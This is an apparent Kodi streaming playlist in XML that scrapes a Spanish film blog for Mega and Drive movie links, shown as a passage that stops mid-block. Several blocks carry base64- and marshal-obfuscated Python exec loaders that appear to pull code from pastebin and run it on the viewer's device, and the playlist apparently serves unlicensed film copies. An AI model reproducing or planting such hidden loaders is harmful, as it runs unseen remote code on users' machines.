import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/m6YPUYA.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
</item>






<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine ElDesvan [COLOR white](Necesario API Drive)[/COLOR]</title>
<link>$doregex[temas]</link>
<regex>
<name>temas</name>
<listrepeat><![CDATA[
<title>[COLOR gold][COLOR white][temas.param2][/COLOR]</title>
<info>[temas.param2]</info>
<link>$doregex[temas2]</link>
<thumbnail>https://i.imgur.com/Q2PguWa.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[dir='ltr' href='(.*?)'>(.*?)<]]></expres>
<page>https://eldesvandelverdugo.blogspot.com/</page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>temas2</name>
<listrepeat><![CDATA[
<title>[COLOR gold][COLOR white][temas2.param2][/COLOR] [temas2.param5]</title>
<info>
[temas2.param4]
[temas2.param5]
[temas2.param6]
[temas2.param7]
[temas2.param8]
[temas2.param14]
[temas2.param16]
[temas2.param17]
</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[temas2.param3]</thumbnail>
<fanart>[temas2.param3]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[temas.param1]'
def GetLSProData(page_data,Cookie_Jar,m,url=url):
    import re,requests,resolveurl,base64
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
    page = re.findall("pager-older-link' href='(.*?)'", html)[0].replace('&amp;','&').replace('max-results=20','max-results=200')
    html2 = requests.get(page, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
    return re.findall("(?s)<div class='post-outer'>.*?<a href='(.*?)'>(.*?)<.*?href=.(.*?)\".*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<", html+html2)
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>temas3</name>
<expres><![CDATA[#$pyFunction
url = '[temas2.param1]'
def GetLSProData(page_data,Cookie_Jar,m,url=url):
    import re,requests,resolveurl,base64
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
    return re.findall('<a href="(https://(?:mega|drive).*?)"', html)[0]
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[temas3]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Q2PguWa.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>







<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]ElDesvan [COLOR white](Necesario API Drive)[/COLOR]</title>
<link>$doregex[temas]</link>
<regex>
<name>temas</name>
<listrepeat><![CDATA[
<title>[COLOR gold][COLOR white][temas.param2][/COLOR]</title>
<info>[temas.param2]</info>
<link>$doregex[temas2]</link>
<thumbnail>https://i.imgur.com/Q2PguWa.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[dir='ltr' href='(.*?)'>(.*?)<]]></expres>
<page>https://eldesvandelverdugo.blogspot.com/</page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>temas18</name>
<listrepeat><![CDATA[
<title>[COLOR gold][COLOR white][temas.param2][/COLOR]</title>
<info>[temas.param2]</info>
<link>$doregex[temas2]</link>
<thumbnail>https://i.imgur.com/Q2PguWa.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import re,requests,resolveurl,base64
    url = 'https://eldesvandelverdugo.blogspot.com/'
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text.replace('á','a').replace('é','e').replace('í','i').replace('ó','o').replace('ú','u')
    return re.findall("dir='ltr' href='(.*?)'>(.*?)<", html)
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>temas2</name>
<listrepeat><![CDATA[
<title>[COLOR gold][COLOR white][temas2.param2][/COLOR] [temas2.param5]</title>
<info>
[temas2.param4]
[temas2.param5]
[temas2.param6]
[temas2.param7]
[temas2.param8]
[temas2.param14]
[temas2.param16]
[temas2.param17]
</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[temas2.param3]</thumbnail>
<fanart>[temas2.param3]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[temas.param1]'
def GetLSProData(page_data,Cookie_Jar,m,url=url):
    import re,requests,resolveurl,base64
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
    page = re.findall("pager-older-link' href='(.*?)'", html)[0].replace('&amp;','&').replace('max-results=20','max-results=200')
    html2 = requests.get(page, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
    return re.findall("(?s)<div class='post-outer'>.*?<a href='(.*?)'>(.*?)<.*?href=.(.*?)\".*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<.*?center.\">\n*(.*?)<", html+html2)
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>temas2222</name>
<listrepeat><![CDATA[
<title>[COLOR gold][COLOR white][temas2.param2][/COLOR] [temas2.param5]</title>
<info>
[temas2.param4]
[temas2.param5]
[temas2.param6]
[temas2.param7]
[temas2.param8]
[temas2.param14]
[temas2.param16]
[temas2.param17]
</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[temas2.param3]</thumbnail>
<fanart>[temas2.param3]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[temas.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>temas3</name>
<expres><![CDATA[<a href="(https://(?:mega|drive).*?)"]]></expres>
<page>[temas2.param1]</page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[temas3]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Q2PguWa.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Renovado (Necesario API Drive)[/COLOR]</title>  
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[A.param1]</title>
<thumbnail>[A.param4]</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
<info>[A.param3]</info>
<link>$doregex[buscador1]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<agent></agent>
</regex>
 <regex>
<name>buscador1</name>
<listrepeat><![CDATA[
<title>[COLOR white][buscador1.param1][/COLOR]</title>
<info>[COLOR white][A.param3][/COLOR]</info>
<link>$doregex[buscador]</link>
<thumbnail>[buscador1.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
info = '[A.param2]'
Tema = '[A.param3]'
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
 <regex>
<name>buscador</name>
<listrepeat><![CDATA[
<title>[COLOR white][buscador.param2][COLOR gold][buscador.param3][/COLOR]</title>
<info>[COLOR white][buscador.param7][/COLOR]</info>
<link>$doregex[id3]</link>
<thumbnail>[buscador.param5]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
tema = '[buscador1.param1]'
expres = '[buscador1.param2]'
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>id3</name>
<expres><![CDATA[#$pyFunction
url = '[buscador.param8]'
import resolveurl,xbmc,xbmcaddon,re
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import re,requests,os,xbmc
    return requests.get('https://pastebin.com/raw/6jhtguGd', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://pastebin.com'}, verify=False).text
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/TFYwyNw.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>
-->

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Renovado (Necesario API Drive)[/COLOR]</title> 
<link>http://ignorame</link>
<externallink>https://pastebin.com/raw/hmg8EGw1</externallink>
<thumbnail>https://i.imgur.com/TFYwyNw.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
</item>




<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Mundocine [COLOR gold][/COLOR]</title>
<link>http://ignorame</link>
<externallink>http://bit.ly/MundocineCristalAzul</externallink>
<thumbnail>https://i.imgur.com/pfht6QG.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
</item>

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Clásico [COLOR gold] [COLOR green][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/IZY7g97.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/2L8wuaw5</externallink>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Actor/Actriz/Director [COLOR gold][COLOR green][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/elkNQ9d.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>http://bit.ly/spercineactores$$LSProEncKey= $$</externallink>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Peticiciones[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
